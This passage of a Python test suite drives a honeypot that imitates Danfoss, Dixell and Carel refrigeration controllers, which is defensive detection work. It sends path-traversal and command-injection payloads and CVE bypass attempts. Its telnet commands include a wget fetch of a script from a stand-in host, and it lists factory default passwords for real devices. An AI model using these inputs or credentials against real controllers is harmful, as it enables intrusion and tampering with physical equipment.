"""Attack the decoy the way public exploits do, and check it logged it.

Starts honeypot.py on loopback once per persona, sends logins, known exploit
requests, Modbus reads and writes and junk, then asserts on the event log.

    python3 -I test_honeypot.py
"""

import json
import os
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
HTTP_PORT, HTTPS_PORT, MODBUS_PORT = 18080, 18443, 15020
FTP_PORT, TELNET_PORT, SNMP_PORT = 12121, 12323, 11161


def start(persona, workdir, **env):
    log_path = os.path.join(workdir, f"{persona}.jsonl")
    env = dict(os.environ, PERSONA=persona, HTTP_PORT=str(HTTP_PORT), LOG_PATH=log_path,
               **{k: str(v) for k, v in env.items()})
    proc = subprocess.Popen([sys.executable, "-I", os.path.join(HERE, "honeypot.py")],
                            env=env, stdout=subprocess.DEVNULL)
    time.sleep(1)
    return proc, log_path


def events(log_path):
    time.sleep(0.3)
    with open(log_path) as f:
        return [json.loads(line) for line in f]


def http(path, data=None, base=f"http://127.0.0.1:{HTTP_PORT}", context=None):
    req = urllib.request.Request(base + path, data=data)
    try:
        resp = urllib.request.urlopen(req, context=context)
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read().decode()
    return resp.status, resp.headers, resp.read().decode()


def modbus(sock, tid, pdu, unit=1):
    sock.sendall(struct.pack(">HHHB", tid, 0, len(pdu) + 1, unit) + pdu)
    _, _, length, _ = struct.unpack(">HHHB", sock.recv(7))
    return sock.recv(length - 1)


def test_danfoss(workdir):
    cert, key = os.path.join(workdir, "cert.pem"), os.path.join(workdir, "key.pem")
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "1",
                    "-subj", "/CN=SM800A", "-keyout", key, "-out", cert],
                   check=True, capture_output=True)
    proc, log_path = start("danfoss", workdir, HTTPS_PORT=HTTPS_PORT, CERT_FILE=cert, KEY_FILE=key)
    try:
        status, headers, page = http("/")
        assert status == 200 and "System Manager 800A" in page
        assert headers["ETag"].startswith('"6a198bb7-') and headers["Connection"] == "keep-alive"
        assert headers["Server"] == "nginx" and "<title>Danfoss StoreView</title>" in page
        status, headers, meta = http("/metadata.json")
        assert status == 200 and json.loads(meta)["Installation_version"] == "4.3.1"
        assert headers["Content-Type"] == "application/json" and headers["ETag"] == '"688b27d9-ab"'
        assert list(headers.keys()) == [
            "Server", "Date", "Content-Type", "Content-Length", "Last-Modified", "Connection", "ETag",
            "Access-Control-Allow-Origin", "Strict-Transport-Security", "Access-Control-Allow-Methods",
            "Access-Control-Allow-Headers", "Cache-Control", "Accept-Ranges"]
        assert http("/wp-login.php")[0] == 404
        assert http("/html/xml.cgi")[0] == 405
        with socket.create_connection(("127.0.0.1", HTTP_PORT)) as s:  # odd method, junk line
            s.sendall(b"OPTIONS / HTTP/1.1\r\nHost: x\r\n\r\n")
            assert b"Error code explanation" not in s.recv(4096)
        with socket.create_connection(("127.0.0.1", HTTP_PORT)) as s:
            s.sendall(b"\x16\x03\x01garbage\r\n\r\n")
            assert b"Error code explanation" not in s.recv(4096)

        insecure = ssl.create_default_context()
        insecure.check_hostname, insecure.verify_mode = False, ssl.CERT_NONE
        status, _, page = http("/", base=f"https://127.0.0.1:{HTTPS_PORT}", context=insecure)
        assert status == 200 and "System Manager 800A" in page
        with socket.create_connection(("127.0.0.1", HTTPS_PORT)) as s:  # not TLS
            s.sendall(b"GET / HTTP/1.0\r\n\r\n")
            try:
                s.recv(100)
            except ConnectionResetError:
                pass

        _, _, xml = http("/html/xml.cgi", b'<cmd action="getauth" user="nobody" password="wrong"/>')
        assert "<session_token>" not in xml and "<accesslevel>255</accesslevel>" in xml
        assert 'error="15"' in http("/html/xml.cgi", b'<cmd action="read_units"/>')[2]
        _, _, xml = http("/html/xml.cgi", b'<cmd action="getauth" user="Supervisor" password="12345"/>')
        token = xml.split("<session_token>")[1].split("<")[0]
        authed = lambda body: urllib.request.urlopen(urllib.request.Request(
            f"http://127.0.0.1:{HTTP_PORT}/html/xml.cgi", data=body, headers={"AKSM-Auth": token})).read().decode()
        units = authed(b'<cmd action="read_units"/>')
        assert "<store_name>" in units
        # One firmware version everywhere: the login page and the API agree.
        assert "<software>SVB501.0.168</software>" in units
        assert "SVB501.0.168" in http("/")[2]
        assert "<store_name>" in http("/xml.cgi", b'<cmd action="read_units" user="admin" pass="admin"/>')[2]
        assert authed(b'<cmd action="read_devices"/>').count("<device ") == 8
        authed(b'<cmd action="start_defrost" node="2"/>')
        assert 'name="Frozen 2" ' in authed(b'<cmd action="read_devices"/>')
        assert 'node="2" name="Frozen 2"' in authed(b'<cmd action="read_devices"/>')
        assert 'defrost="1"' in authed(b'<cmd action="read_devices"/>')
        sys.path.insert(0, HERE)
        from honeypot import code_of_the_day
        from datetime import datetime, timezone
        good = code_of_the_day(datetime.now(timezone.utc).date())
        _, _, xml = http("/xml.cgi", f'<cmd user="" password="{good}" action="getauth" eds_only="1"></cmd>'.encode())
        assert "<session_token>" not in xml  # 4.3.1 is patched; the attempt is still logged
        http("/xml.cgi", b'<cmd user="" password="00000" action="getauth" eds_only="1"></cmd>')
        http("/html/xml.cgi", b'<cmd action="getauth" user="\x1b[2Jx" password="p"/>')
        http("/" + "%ff" * 3000, "\xff".encode("latin-1") * 8000)
        _, _, xml = http("/html/xml.cgi", b'<cmd action="read_date_time"/>')
        assert 'error="0"' in xml and "<year>" in xml
        http("/xml.cgi", b'<cmd action="get_file" filename="../../etc/shadow" offset="0"/>')
        http("/html/xml.cgi", b'<cmd action="load_cert" filename="`id`"/>')
        _, _, xml = http("/html/xml.cgi", b'<cmd action="x&quot;><evil/>"/>')
        assert "<evil/>" not in xml
        # A browser escapes what is typed (a"b<c&d), so the log must hold the typed password.
        http("/html/xml.cgi", b'<cmd action="getauth" user="u&amp;v" password="a&quot;b&lt;c&amp;d&gt;"/>')

        log = events(log_path)
        logins = [e for e in log if e["event"] == "login_attempt"]
        assert [(e["username"], e["granted"]) for e in logins[:2]] == [("nobody", False), ("Supervisor", True)]
        assert any((e["username"], e["password"]) == ("u&v", 'a"b<c&d>') for e in logins), logins[-1]
        exploits = [e["exploit"] for e in log if e["event"] == "xml_cmd" and e["exploit"]]
        assert exploits == ["CVE-2025-41450 code-of-the-day bypass, correct code",
                            "CVE-2025-41450 code-of-the-day bypass",
                            "CVE-2023-25914 path traversal", "CVE-2023-25915 command injection"]
        assert any(e["event"] == "control" and e["defrost"] and e["node"] == "2" for e in log)
        assert any(e["proto"] == "https" and e["event"] == "request" for e in log)
        assert any(e["event"] == "tls_error" for e in log)
        assert any(e["event"] == "request" and e["method"] == "OPTIONS" for e in log)
        assert any(e["event"] == "bad_request" for e in log)
        assert not any(e["proto"] == "modbus" for e in log)  # off by default

        summary = subprocess.run([sys.executable, "-I", os.path.join(HERE, "summary.py"),
                                  "--ignore", "10.9.9.9", "--hours", "1"],
                                 stdin=open(log_path), capture_output=True, text=True, check=True).stdout
        assert "CVE-2023-25914 path traversal" in summary and "last 1h" in summary
        assert "(accepted: 2)" in summary and "DEFROST" in summary
        assert "\x1b" not in summary
        with open(log_path, "rb") as f:
            assert max(len(line) for line in f) <= 9000
    finally:
        proc.terminate()
        proc.wait(timeout=5)


def test_dixell(workdir):
    proc, log_path = start("dixell", workdir, MODBUS_PORT=MODBUS_PORT)
    try:
        status, headers, page = http("/")
        assert "<title>XWEB EVO</title>" in page and 'id="login-username"' in page
        assert "Server" not in headers and list(headers.keys())[0] == "Content-Type"
        assert list(headers.keys())[-2:] == ["Content-Length", "Date"]
        assert http("/js/xweb.js")[0] == 200 and headers["Content-Length"] == "8202"
        assert 'src="img/xweb-logo.png"' in page and 'id="login-mode"' in page
        assert '"user"' not in http("/cgi-bin/login.lua", b"action=login&auth_mode=standard&username=admin&password=x&initparam=-1")[2]
        reply = json.loads(http("/cgi-bin/login.lua", b"action=login&auth_mode=standard&username=Admin&password=Admin&initparam=-1")[2])
        sses = reply["user"]["sses"]
        chart = json.loads(http("/cgi-bin/datachart.cgi", f"SSES={sses}&source=circular&request=1".encode())[2])
        assert len(chart) == 8 and "1" in chart["1"][0]
        assert 'id="login-screen"' in http("/cgi-bin/datachart.cgi", b"SSES=bogus")[2]
        for _ in range(5):
            http("/cgi-bin/login.lua", b"action=login&username=Root&password=guess")
        assert '"locked": true' in http("/cgi-bin/login.lua", b"action=login&username=Root&password=guess")[2]
        http("/cgi-bin/login.lua", b"action=login&auth_mode=x&username=a&password=b")
        assert "<script>x" not in http("/<script>x</script>")[2]
        assert http("/cgi-bin/lo_utils.cgi", b"ACTION=5")[0] == 200

        with socket.create_connection(("127.0.0.1", MODBUS_PORT)) as s:
            r = modbus(s, 1, struct.pack(">BHH", 3, 0, 4))           # read 4 temps
            temps = struct.unpack(">4h", r[2:])
            assert r[:2] == bytes([3, 8]) and all(-250 < t < -100 for t in temps), temps
            assert modbus(s, 2, struct.pack(">BHH", 6, 200, 1))[0] == 6        # defrost
            r = modbus(s, 3, struct.pack(">BHHB", 16, 100, 1, 2) + struct.pack(">h", 800))
            assert r[0] == 16                                                  # setpoint 80 C
            assert b"Dixell" in modbus(s, 4, bytes([0x2B, 0x0E, 0x01, 0x00]))  # device id
            assert modbus(s, 5, bytes([0x5A, 0x00])) == bytes([0xDA, 0x01])    # unknown fc
            assert modbus(s, 6, struct.pack(">BHH", 3, 50, 1)) == bytes([0x83, 0x02])  # unmapped
        with socket.create_connection(("127.0.0.1", MODBUS_PORT)) as s:        # junk header
            s.sendall(b"\xff" * 20)
            try:
                assert s.recv(10) == b""
            except ConnectionResetError:
                pass

        log = events(log_path)
        kinds = {(e["proto"], e["event"]) for e in log}
        logins = [e for e in log if e["event"] == "login_attempt"]
        assert (logins[0]["username"], logins[0]["password"], logins[0]["granted"]) == ("admin", "x", False)
        assert any(e.get("exploit") == "CVE-2021-45420 command execution" for e in log)
        assert any(e.get("exploit", "").startswith("CVE-2026-25085") for e in log)
        assert any(e["event"] == "login_attempt" and e["granted"] for e in log)
        writes = [e for e in log if e["event"] == "write"]
        assert writes[0]["defrost"] is True and writes[0]["start"] == 200
        assert writes[1]["values"] == [800] and writes[1]["defrost"] is False
        assert {("modbus", "device_id"), ("modbus", "unsupported"), ("modbus", "malformed")} <= kinds
        assert all(e["src_ip"] == "127.0.0.1" for e in log if e["proto"] != "system")
    finally:
        proc.terminate()
        proc.wait(timeout=5)


def test_danfoss_index_file(workdir):
    # A stand-in for the firmware's index.html: same shape, not the vendor's bytes.
    index = os.path.join(workdir, "index.html")
    page = (b'<!doctype html>\n<html><head><title>Danfoss StoreView</title>'
            b'<link rel="stylesheet" href="styles.aaa.css"></head><body><app-root></app-root>'
            b'<script src="runtime.bbb.js"></script><script src="main.ccc.js"></script></body></html>\n')
    with open(index, "wb") as f:
        f.write(page)
    os.utime(index, (0x688B26F2, 0x688B26F2))
    os.makedirs(os.path.join(workdir, "assets", "images"), exist_ok=True)
    with open(os.path.join(workdir, "assets", "images", "Danfoss-logo.png"), "wb") as f:
        f.write(b"\x89PNG stand-in")
    proc, log_path = start("danfoss", workdir, INDEX_FILE=index)
    try:
        status, headers, body = http("/")
        assert status == 200 and body.encode() == page
        assert headers["ETag"] == f'"688b26f2-{len(page):x}"'
        assert headers["Last-Modified"] == "Thu, 31 Jul 2025 08:18:58 GMT"
        status, headers, js = http("/main.ccc.js")
        assert status == 200 and "System Manager 800A" in js
        assert headers["ETag"].startswith('"688b26f2-')
        assert http("/runtime.bbb.js")[:3:2] == (200, "")
        status, headers, css = http("/styles.aaa.css")
        assert status == 200 and headers["Content-Type"] == "text/css"
        assert http("/main.zzz.js")[0] == 404
        with urllib.request.urlopen(f"http://127.0.0.1:{HTTP_PORT}/assets/images/Danfoss-logo.png") as r:
            assert r.headers["Content-Type"] == "image/png" and r.read() == b"\x89PNG stand-in"
    finally:
        proc.terminate()
        proc.wait(timeout=5)


def test_unit_strings(workdir):
    # Store name and MAC address are per-unit strings, so each deployment sets its own.
    proc, _ = start("danfoss", workdir, STORE_NAME="Konijn & Zonen 7731", MAC_ADDRESS="00:07:68:11:22:33")
    try:
        units = http("/xml.cgi", b'<cmd action="read_units" user="admin" pass="admin"/>')[2]
        assert "<store_name>Konijn &amp; Zonen 7731</store_name>" in units
        assert "<macaddr>00:07:68:11:22:33</macaddr>" in units and "3e:91:4d" not in units
    finally:
        proc.terminate()
        proc.wait(timeout=5)
    proc, _ = start("dixell", workdir, MAC_ADDRESS="00:1a:22:aa:bb:cc")
    try:
        page = http("/")[2]
        assert "MAC 00:1a:22:aa:bb:cc</div>" in page and "00:1a:22:6b:0e:41" not in page
        assert len(page.encode()) == 8202
    finally:
        proc.terminate()
        proc.wait(timeout=5)


def raw_http(request, port=HTTP_PORT):
    """Send raw bytes, return (status line, header names in order, header dict, body bytes)."""
    with socket.create_connection(("127.0.0.1", port)) as s:
        s.sendall(request)
        data = b""
        while chunk := s.recv(65536):
            data += chunk
    head, _, body = data.partition(b"\r\n\r\n")
    lines = head.decode("latin-1").split("\r\n")
    names = [line.split(":", 1)[0] for line in lines[1:]]
    return lines[0], names, {n.lower(): line.split(":", 1)[1].strip()
                             for n, line in zip(names, lines[1:])}, body


def basic(user, password):
    import base64
    return b"Authorization: Basic " + base64.b64encode(f"{user}:{password}".encode()) + b"\r\n"


def test_pcoweb(workdir):
    # A real card's clock starts at 1970 (no RTC) on about a third of units; PCOWEB_CLOCK=1970 picks that.
    proc, log_path = start("pcoweb", workdir, MAC_ADDRESS="00:0a:5c:1f:ea:00", PCOWEB_CLOCK="1970")
    try:
        # GET / is a small redirect stub, not a 401; header names and order as on real cards.
        line, names, h, body = raw_http(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
        assert line == "HTTP/1.1 200 OK"
        assert names == ["Server", "Content-type", "Date", "Last-modified", "Accept-Ranges",
                         "Connection", "Content-length"]
        assert h["server"] == "thttpd/2.20c 21nov01" and h["content-type"] == "text/html; charset=iso-8859-1"
        assert h["content-length"] in ("364", "367") and int(h["content-length"]) == len(body)
        assert b"This page will be redirected" in body and b"Carel pCOWeb Home Page" in body
        assert h["date"].split()[3] == "1970" and h["last-modified"].split()[3] == "1970"
        # HEAD sends the same headers and no body.
        _, names, h2, body = raw_http(b"HEAD / HTTP/1.1\r\nHost: x\r\n\r\n")
        assert body == b"" and h2["content-length"] == h["content-length"]
        # The page behind the redirect asks for a password: no Content-length, Basic realm flash/http.
        line, names, h, body = raw_http(b"GET /http/index.html HTTP/1.1\r\nHost: x\r\n\r\n")
        assert line == "HTTP/1.1 401 Unauthorized"
        assert names == ["Server", "Content-type", "Date", "Last-modified", "Accept-Ranges",
                         "Connection", "WWW-Authenticate"]
        assert h["www-authenticate"] == 'Basic realm="flash/http"' and h["last-modified"] == h["date"]
        assert body.startswith(b"<HTML>\n<HEAD><TITLE>401 Unauthorized</TITLE>")
        assert b"Authorization required for the URL '/http/index.html'." in body
        assert body.endswith(b"thttpd/2.20c 21nov01</A></ADDRESS>\n</BODY>\n</HTML>\n") and len(body) == 316
        # A wrong password gets the very same answer.
        _, names2, h2, body2 = raw_http(b"GET /http/index.html HTTP/1.1\r\nHost: x\r\n" + basic("admin", "admin") + b"\r\n")
        assert names2 == names and body2 == body
        # The documented factory login opens the default page, sent as HTTP/1.0 by the tag filter.
        line, names, h, page = raw_http(b"GET /http/index.html HTTP/1.1\r\nHost: x\r\n" + basic("admin", "fadmin") + b"\r\n")
        assert line == "HTTP/1.0 200 OK"
        assert names == ["Content-type", "Cache-Control", "Expires"] and h["expires"] == "-1"
        assert b"pCOWeb Default Page" in page and b"00:0a:5c:1f:ea:00" in page
        assert b"A1.5.4" in page and b"../config/adminpage.html" in page and len(page) == 3296
        # The admin area is a second password area (thttpd uses the folder as the realm),
        # laid out like the card's configuration pages: a tab row plus system menus.
        line, _, h, body = raw_http(b"GET /config/adminpage.html HTTP/1.1\r\nHost: x\r\n\r\n")
        assert line == "HTTP/1.1 401 Unauthorized" and h["www-authenticate"] == 'Basic realm="config"'
        auth = basic("httpadmin", "fhttpadmin")
        line, _, h, body = raw_http(b"GET /config/adminpage.html HTTP/1.1\r\nHost: x\r\n" + auth + b"\r\n")
        assert line == "HTTP/1.0 200 OK" and b"<title>pCOWeb Configuration</title>" in body
        assert b"System Utilities" in body and b"Fix permissions of HTML pages and CGI scripts" in body
        assert b'href="pw_firmware.html"' in body and b'href="scanplugins.cgi"' in body
        # Each tab leads to its own page, behind the same password.
        for page, title in [("pw_network.html", b"Network Configuration"), ("pw_pcocom.html", b"pCO Communication Configuration"),
                            ("pw_modbustcp.html", b"Modbus TCP Configuration"), ("pw_snmp.html", b"SNMP Configuration"),
                            ("pw_bacnet.html", b"BACnet Configuration"), ("scanplugins.cgi", b"Plugin Configuration"),
                            ("pw_users.html", b"Change User Passwords"), ("pw_firmware.html", b"Firmware Upgrade"),
                            ("pw_inet_ports.html", b"Configure Internet services")]:
            assert raw_http(f"GET /config/{page} HTTP/1.1\r\nHost: x\r\n\r\n".encode())[0] == "HTTP/1.1 401 Unauthorized"
            line, _, h, body = raw_http(f"GET /config/{page} HTTP/1.1\r\nHost: x\r\n".encode() + auth + b"\r\n")
            assert line == "HTTP/1.0 200 OK" and b"<title>" + title + b"</title>" in body, page
        # Menu links and the stylesheet answer too (behind the same password).
        get = lambda path: raw_http(f"GET {path} HTTP/1.1\r\nHost: x\r\n".encode() + auth + b"\r\n")
        for path, text in [("/config/adjustattrib.cgi", b"Attributes"), ("/config/stopservices.cgi", b"Services stopped"),
                           ("/config/clearflashdisk.cgi", b"Operation completed"),
                           ("/config/pw_view_network.cgi", b"HWaddr 00:0A:5C:1F:EA:00"),
                           ("/config/result.html?%3fscript%3arccmd%28%27do_flashroom%27%29", b"Filesystem"),
                           ("/config/result.html?%3fscript%3arccmd%28%27factdefcfg%27%29", b"IP address")]:
            line, _, h, body = get(path)
            assert line == "HTTP/1.0 200 OK" and text in body, path
        line, _, h, body = get("/config/style.css")
        assert line == "HTTP/1.0 200 OK" and b"font-family" in body
        # The pages carry the card's real form fields.
        for page, texts in [("pw_network.html", [b"IP Address Main", b"Gateway Address", b"Primary DNS"]),
                            ("pw_pcocom.html", [b"Baud rate", b"Modbus Extended"]),
                            ("pw_modbustcp.html", [b"Modbus TCP port", b"Map mode"]),
                            ("pw_snmp.html", [b"Read/Write community", b"System contact"]),
                            ("pw_bacnet.html", [b"pCOWeb Device Instance", b"APDU timeout"]),
                            ("pw_users.html", [b"System Administrator", b"httpadmin", b"carel", b"guest"]),
                            ("pw_firmware.html", [b"flash_apps_Axxx.bin", b"flash_sys_Byyy.bin"]),
                            ("pw_inet_ports.html", [b"Telnet", b"FTP"])]:
            body = get(f"/config/{page}")[3]
            assert b"<form" in body and b'method="POST"' in body and all(x in body for x in texts), page
        # Saving a form answers like the card and is logged with what was sent.
        post = b"?script:setdb('ifcfg','ip00')=10.9.8.7"
        head = b"POST /config/pw_network.html HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\n" % len(post)
        assert raw_http(head + b"\r\n" + post)[0] == "HTTP/1.1 401 Unauthorized"
        line, _, h, body = raw_http(head + auth + b"\r\n" + post)
        assert line == "HTTP/1.0 200 OK" and b"Network configuration has been saved on device." in body
        assert any(e["event"] == "request" and e["method"] == "POST" and "10.9.8.7" in e["body"] for e in events(log_path))
        # Pictures sit behind the same password as the page.
        assert raw_http(b"GET /http/index_img/pw_logo.jpg HTTP/1.1\r\nHost: x\r\n\r\n")[0] == "HTTP/1.1 401 Unauthorized"
        line, _, h, body = raw_http(b"GET /http/index_img/pw_logo.jpg HTTP/1.1\r\nHost: x\r\n" + basic("admin", "fadmin") + b"\r\n")
        assert line == "HTTP/1.1 200 OK" and h["content-type"] == "image/jpeg" and body.startswith(b"GIF8")
        # Unknown paths and unusual methods get thttpd's own pages.
        line, _, h, body = raw_http(b"GET /nonexistent HTTP/1.1\r\nHost: x\r\n\r\n")
        assert line == "HTTP/1.1 404 Not Found" and len(body) == 318
        assert b"The requested URL '/nonexistent' was not found on this server." in body
        line, _, h, body = raw_http(b"OPTIONS / HTTP/1.1\r\nHost: x\r\n\r\n")
        assert line == "HTTP/1.1 501 Not Implemented" and len(body) == 333
        assert b"The requested method 'OPTIONS' is not implemented by this server." in body
        # Logins are logged with the password and whether it worked.
        logins = [e for e in events(log_path) if e["event"] == "login_attempt"]
        assert [(e["username"], e["password"], e["granted"]) for e in logins[:2]] == [
            ("admin", "admin", False), ("admin", "fadmin", True)]
        assert all(e["persona"] == "pcoweb" for e in logins)
    finally:
        proc.terminate()
        proc.wait(timeout=5)
    # PCOWEB_CLOCK=ntp picks a card whose clock was set by NTP, so dates are current.
    proc, _ = start("pcoweb", workdir, MAC_ADDRESS="00:0a:5c:aa:bb:ff", PCOWEB_CLOCK="ntp")
    try:
        _, _, h, _ = raw_http(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
        assert int(h["date"].split()[3]) >= 2026 and int(h["last-modified"].split()[3]) >= 2025
        assert b"00:0a:5c:aa:bb:ff" in raw_http(b"GET /http/index.html HTTP/1.0\r\n" + basic("admin", "fadmin") + b"\r\n")[3]
    finally:
        proc.terminate()
        proc.wait(timeout=5)


def http_get_auth(path):
    return raw_http(f"GET {path} HTTP/1.1\r\nHost: x\r\n".encode() + basic("httpadmin", "fhttpadmin") + b"\r\n")[3]


def test_pcoweb_ftp_telnet(workdir):
    # Same MAC as above: the card's host name is pCOWeb plus the last three octets.
    proc, log_path = start("pcoweb", workdir, MAC_ADDRESS="00:0a:5c:c8:24:f9", FTP_PORT=FTP_PORT, TELNET_PORT=TELNET_PORT,
                      MODBUS_PORT=MODBUS_PORT, SNMP_PORT=SNMP_PORT, PCOWEB_CLOCK="1970")
    host = "pCOWebc824f9"
    try:
        def talk(sock, text, until):
            sock.sendall(text)
            data = b""
            while until not in data:
                chunk = sock.recv(4096)
                assert chunk, data
                data += chunk
            return data

        with socket.create_connection(("127.0.0.1", FTP_PORT), timeout=5) as s:
            greeting = talk(s, b"", b"\r\n")
            assert greeting == f"220 {host} FTP server (GNU inetutils 1.3.2) ready.\r\n".encode()
            assert talk(s, b"PASS x\r\n", b"\r\n") == b"503 Login with USER first.\r\n"
            assert talk(s, b"USER anonymous\r\n", b"\r\n") == b"530 User anonymous unknown.\r\n"
            assert talk(s, b"FEAT\r\n", b"\r\n") == b"500 'FEAT': command not understood.\r\n"
            assert talk(s, b"PWD\r\n", b"\r\n") == b"530 Please login with USER and PASS.\r\n"
            help_text = talk(s, b"HELP\r\n", b"ftp-bugs@")
            assert help_text.startswith(b"214- The following commands are recognized (* =>'s unimplemented).\n   USER    PORT")
            assert help_text.count(b"\n") == 8 and b"\r" not in help_text.split(b"214 Direct")[0]
            assert talk(s, b"USER httpadmin\r\n", b"\r\n") == b"331 Password required for httpadmin.\r\n"
            assert talk(s, b"PASS wrong\r\n", b"\r\n") == b"530 Login incorrect.\r\n"
            assert talk(s, b"USER httpadmin\r\n", b"\r\n") == b"331 Password required for httpadmin.\r\n"
            assert talk(s, b"PASS fhttpadmin\r\n", b"\r\n") == b"230 User httpadmin logged in.\r\n"
            assert talk(s, b"PWD\r\n", b"\r\n") == b'257 "/" is current directory.\r\n'
            assert talk(s, b"SYST\r\n", b"\r\n") == b"215 UNIX Type: L8\r\n"
            assert talk(s, b"CWD /usr/local/root/flash/http\r\n", b"\r\n") == b"250 CWD command successful.\r\n"
            assert talk(s, b"CWD /nonexistent\r\n", b"\r\n") == b"550 /nonexistent: No such file or directory.\r\n"
            assert talk(s, b"PORT 10,0,0,1,4,1\r\n", b"\r\n") == b"200 PORT command successful.\r\n"
            assert talk(s, b"PASV\r\n", b"\r\n").startswith(b"227 Entering Passive Mode (192,168,1,100,")
            assert talk(s, b"STOR dropper.sh\r\n", b"\r\n").startswith(b"425 ")  # no data channel behind it
            assert talk(s, b"QUIT\r\n", b"\r\n") == b"221 Goodbye.\r\n"

        with socket.create_connection(("127.0.0.1", TELNET_PORT), timeout=5) as s:
            data = talk(s, b"", b"login: ")
            assert data.startswith(bytes([255, 251, 3, 255, 251, 5]))  # IAC WILL SGA, WILL STATUS ...
            assert data.endswith(f"\r\nLinux 2.4.21-rmk1 ({host}) (ttya0)\r\n\r\n\r\n{host} login: ".encode())
            assert b"Password: " in talk(s, b"root\r\n", b"Password: ")
            data = talk(s, b"wrongpass\r\n", f"{host} login: ".encode())
            assert b"Login incorrect" in data
            assert b"Password: " in talk(s, b"root\r\n", b"Password: ")
            data = talk(s, b"froot\r\n", b"$ ")
            assert b"[root@" + host.encode() in data and data.endswith(b" /]$ ")
            assert b"uid=0(root)" in talk(s, b"id\r\n", b"$ ")
            assert b"2.4.21-rmk1" in talk(s, b"uname -a\r\n", b"$ ")
            assert b"thttpd" in talk(s, b"ps\r\n", b"$ ")
            assert b"MIRAI: applet not found" in talk(s, b"/bin/busybox MIRAI\r\n", b"$ ")
            assert b"wget: command not found" in talk(s, b"wget http://198.51.100.9/x.sh\r\n", b"$ ")
            assert b"bin" in talk(s, b"ls /\r\n", b"$ ")
            assert b"MIRAI" in talk(s, b"echo -e '\\x4d\\x49\\x52\\x41\\x49'\r\n", b"$ ")  # \x escapes are decoded
            assert b"/dev/mtdblock" in talk(s, b"cat /proc/mounts\r\n", b"$ ")
            assert b"ARM" in talk(s, b"cat /proc/cpuinfo\r\n", b"$ ")
            assert b"command not found" not in talk(s, b"sh\r\n", b"$ ")
            assert b"No such file" not in talk(s, b"ls /proc\r\n", b"$ ")
            time.sleep(32)  # past the 30 s cap for ordinary connections: a logged-in session must survive
            assert b"uid=0(root)" in talk(s, b"id\r\n", b"$ ")
            s.sendall(b"exit\r\n")
        with socket.create_connection(("127.0.0.1", TELNET_PORT), timeout=5) as s:  # bots end lines with a bare LF
            talk(s, b"", b"login: ")
            assert b"Password: " in talk(s, b"root\n", b"Password: ")
            assert b"$ " in talk(s, b"froot\n", b"$ ")
        # Modbus TCP: holding register n is analog variable n in tenths of a unit; 10 is the writable setpoint.
        with socket.create_connection(("127.0.0.1", MODBUS_PORT), timeout=5) as s:
            r = modbus(s, 1, struct.pack(">BHH", 3, 10, 1))
            assert struct.unpack(">h", r[2:4])[0] == -180
            assert modbus(s, 2, struct.pack(">BHH", 6, 10, struct.unpack(">H", struct.pack(">h", -170))[0]))[0] == 6
            r = modbus(s, 3, struct.pack(">BHH", 3, 10, 1))
            assert struct.unpack(">h", r[2:4])[0] == -170
            assert modbus(s, 4, struct.pack(">BHH", 3, 500, 1)) == bytes([0x83, 0x02])  # no such variable
            assert len(modbus(s, 5, struct.pack(">BHH", 3, 1, 20))) == 2 + 40       # a normal 20 register read works
            assert modbus(s, 6, struct.pack(">BHH", 1, 1, 16))[0] == 1              # coils answer
            assert modbus(s, 7, bytes([0x2B, 0x0E, 0x01, 0x00])) == bytes([0xAB, 0x01])  # no device id object
        # SNMP v1/v2c: the card answers "public" with its system group and ignores other communities.
        def ber(tag, body):
            n = len(body)
            return bytes([tag]) + (bytes([n]) if n < 128 else bytes([0x81, n])) + body

        def oid(text):
            p = [int(x) for x in text.split(".")]
            return ber(6, bytes([40 * p[0] + p[1]]) + bytes(p[2:]))  # arcs below 128 only

        def snmp(community, pdu_tag, text, version=0):
            vb = ber(0x30, ber(0x30, oid(text) + ber(5, b"")))
            pdu = ber(pdu_tag, ber(2, b"\x01") + ber(2, b"\x00") + ber(2, b"\x00") + vb)
            return ber(0x30, ber(2, bytes([version])) + ber(4, community.encode()) + pdu)

        def ask(packet):
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as u:
                u.settimeout(2)
                u.sendto(packet, ("127.0.0.1", SNMP_PORT))
                try:
                    return u.recvfrom(2048)[0]
                except socket.timeout:
                    return None

        reply = ask(snmp("public", 0xA0, "1.3.6.1.2.1.1.1.0"))
        assert reply and reply[0] == 0x30 and b"pCO Gateway" in reply and b"\xa2" in reply
        assert b"Italy" in ask(snmp("public", 0xA1, "1.3.6.1.2.1.1.5.0"))  # GETNEXT: name -> location
        assert b"pcoweb@carel.com" in ask(snmp("public", 0xA1, "1.3.6.1.2.1.1.3.0"))  # GETNEXT: uptime -> contact
        assert ask(snmp("wrong-community", 0xA0, "1.3.6.1.2.1.1.1.0")) is None
        assert ask(snmp("public", 0xA5, "1.3.6.1.2.1.1.1.0", version=1)) is None  # GETBULK is never answered
        assert ask(snmp("carel", 0xA3, "1.3.6.1.2.1.1.5.0")) is None               # nor SET
        reply = ask(snmp("public", 0xA0, "1.3.6.1.2.1.1.3.0"))
        ticks = int.from_bytes(reply[reply.index(b"\x43") + 2:][:reply[reply.index(b"\x43") + 1]], "big")
        assert 20 * 86400 * 100 < ticks < 130 * 86400 * 100, ticks  # a card with no clock: uptime is the 1970 date
        page = http_get_auth("/config/pw_snmp.html")
        assert b"pCO Gateway" in page and b"Italy" in page and b"&lt;pcoweb@carel.com&gt;" in page, page
        assert ask(b"\x30\x03garbage") is None
        log = events(log_path)
        snmp_events = [e for e in log if e["proto"] == "snmp"]
        assert [(e["community"], e["answered"]) for e in snmp_events if e["event"] == "request"][:4] == [
            ("public", True), ("public", True), ("public", True), ("wrong-community", False)], snmp_events
        assert any(e["proto"] == "modbus" and e["event"] == "write" and e["start"] == 10 for e in log)
        logins = [(e["proto"], e["username"], e["password"], e["granted"]) for e in log if e["event"] == "login_attempt" and e["proto"] != "http"]
        assert logins == [("ftp", "httpadmin", "wrong", False), ("ftp", "httpadmin", "fhttpadmin", True),
                          ("telnet", "root", "wrongpass", False), ("telnet", "root", "froot", True),
                          ("telnet", "root", "froot", True)], logins  # the last one logged in with bare LFs
        cmds = [e["cmd"] for e in log if e["event"] == "command"]
